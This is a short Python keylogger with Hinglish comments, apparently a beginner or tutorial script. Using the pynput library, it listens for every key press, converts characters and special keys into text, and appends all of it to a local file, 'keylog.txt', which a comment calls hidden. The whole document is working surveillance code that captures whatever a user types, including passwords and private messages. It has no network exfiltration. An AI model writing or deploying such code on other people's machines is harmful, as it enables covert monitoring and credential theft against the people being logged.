#!/usr/bin/env python3
import pynput.keyboard

log = ""

# Ye function har bar tab chalega jab koi key dabegi
def process_key_press(key):
    global log
    try:
        # Agar normal alphabet ya number type hua (a, b, c, 1, 2)
        log = str(key.char)
    except AttributeError:
        # Agar special key type hui (Space, Enter, Shift)
        if key == key.space:
            log = " "
        elif key == key.enter:
            log = "\n"
        else:
            log = " [" + str(key) + "] "
            
    # Sath ke sath ek hidden file mein sab save karte jao
    with open("keylog.txt", "a") as log_file:
        log_file.write(log)

print("[*] Keylogger Started in Background... Type anything to test.")

# Keyboard ko lagatar monitor karne wala "Listener"
keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    keyboard_listener.join()
